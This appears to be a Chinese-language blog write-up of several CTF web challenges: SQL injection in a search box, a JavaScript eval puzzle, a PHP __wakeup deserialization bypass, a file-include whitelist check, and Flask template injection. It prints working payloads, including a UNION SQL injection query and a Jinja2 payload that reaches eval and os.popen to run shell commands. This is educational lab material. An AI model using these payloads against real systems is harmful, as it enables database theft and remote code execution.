    NewsCenter

    题目来源：XCTF 4th-QCTF-2018

    网站里有个搜索框，经过查看源码，查看数据包没有发现有什么提示或者不一样的地方。然后随便输入了一些字符，进行观察，发现在输入特殊字符或不存在的内容时会返回空页面。
    对于这种搜索框，很容易联想到SQL注入，分析包发现数据请求是POST请求，这里可以利用bp抓包然后将请求包保存为txt文件利用sqlmap跑即可

    sqlmap.py -r C:\Users\Windows7\Desktop\flag.txt

    发现存在时间盲注和union联合查询漏洞，接下来跑库名表名列出数据库即可找到flag

    这题比较简单，我们手工注入也可以
    先使用order by来获取有多少个字段


    可以发现这个表中有3个字段
    接下来使用union联合查询

    第二个字段和第三个字段可以注入

    找到数据库名，查表名，最后发现这个数据库里只有news表和secret_table表

    hack’ union select 1,(select column_name from information_schema.columns where table_schema=’news’ and table_name=’secret_table’ limit 0,1),3 #

    利用上面语句列字段名，发现一个fl4g字段，检索该字段值得到flag

    NaNNaNNaNNaN-Batman

    题目来源：tinyctf-2014

    NaNNaNNaNNaN-Batman
    下载下来解压后不知道是什么文件，直接上winhex，发现有script标签，里面是一段js代码

    直接改后缀为html，用浏览器打开发现有个输入框，暂时不知道有什么用😂
    对代码进行审计，发现最后eval函数执行了_变量中的内容，也就是单引号内的内容，里面是有个函数，然而eval没有执行里面的函数，只是执行了字符串(导致了乱码)，所以打开的html的页面没有反应。只显示了input标签的内容，但我们想知道_函数的内容，而不是执行，那么我们可以使用alert弹窗，将eval函数改为alert，在弹窗里就能看到函数源码了。

    eval() 函数:可计算某个字符串，并执行其中的的 JavaScript 代码。
    alert() 函数:用于显示带有一条指定消息和一个 确定按钮的警告框。

    审计这段代码就知道一开始的输入框里要填入什么内容了，其中获取flag的代码段应该是for循环那一段，所以我们要想办法让函数执行那一段代码。

    我们输入的参数存在了”c”里，点击按钮时执行$()函数
    函数将值传给了e
    e必须满足的条件

    • 长度为16
    • 开头为be0f23
    • 从字符串里匹配233ac
    • 结尾为e98aa
    • 从字符串里匹配c7be9

    match() 方法可在字符串内检索指定的值，或找到一个或多个正则表达式的匹配。
    ^表示开头一定要匹配到be0f23，$表示结尾一定要匹配到e98aa,其它没有位置要求

    因此我们构造出be0f233ac7be98aa，将此输入到最开始时的输入框中，点击即可得到flag

    当然我们还有更简单的方法，因为我们的目的时执行for循环那段关键代码，解读那段代码，其实是将上面数组内的字符用循环先将第一个字符连接起来(flag{it)后再连接每组的第二个字符，直接就能获取flag了，也可以将代码段放入控制台内执行。

    unserialize3

    题目来源：unserialize3

    题目翻译过来就是反序列化
    所用到的知识点

    • serialize()函数：用于序列化对象或数组，并返回一个字符串。序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。
    • unserialize()函数：用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。
    • 魔术方法：PHP 将所有以 _（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 _ 为前缀。
    • serialize()和unserialize()函数对魔术方法的处理：serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，然后才执行序列化操作，此功能可以用于清理对象。
    • unserialize()函数会检查类中是否存在一个魔术方法__wakeup()，如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。
    • wakeup()执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，则不会执行wakeup()函数，这也是一个绕过点。

    题目给出的代码

    class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}

    我们进行补全代码对xctf类进行序列化

    <?php
class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}
}
$c = new xctf();
print(serialize($c));
?>

    得到
    O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}
    只需要改变其中的某个属性即可绕过，例如将3改为2，当然也可以将1改为2，不要更改双引号内的内容，不能更改格式即可。
    然后将更改后的值传给code，访问网站即可得到flag。

    warmup

    题目来源：HCTF 2018

    查看源码发现，一个source.php，输入url后可以看到源码

    <?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>

    Web_python_template_injection

    题目来源：XTCTF

    python的flask模板的注入
    这里先直接再链接后加上{ {7+8} },返回

    执行了{ { } }里的内容

    列出文件
    我们需要找到flag，就要使用到目录遍历命令(使用ls命令)，来列出所有文件，找到flag文件后，需要查看内容(使用到cat命令)。
    想要执行以上命令，就需要在可执行系统命令的情况下进行。

    {% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}                        //找到catch_warnings模块
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}                         //找到eval函数
    {% if 'eval' in b.keys() %}                                //找到了
      {{ b['eval']('__import__("os").popen("ls").read()') }}   //导入cmd 执行popen里的命令 read读出数据
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}

    因为如果执行命令需要os模块这里os模块是在warnings.catch_warnings模块里
    我们需要利用eval函数来执行系统命令，可以利用func_globals.keys()查找全局函数(包含eval函数)

    然后将ls改成cat fl4g即可看到flag

    {% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}  
  {% if b.__class__ == {}.__class__ %}         //遍历基类 找到eval函数
    {% if 'eval' in b.keys() %}    //找到了
      {{ b['eval']('__import__("os").popen("cat fl4g").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
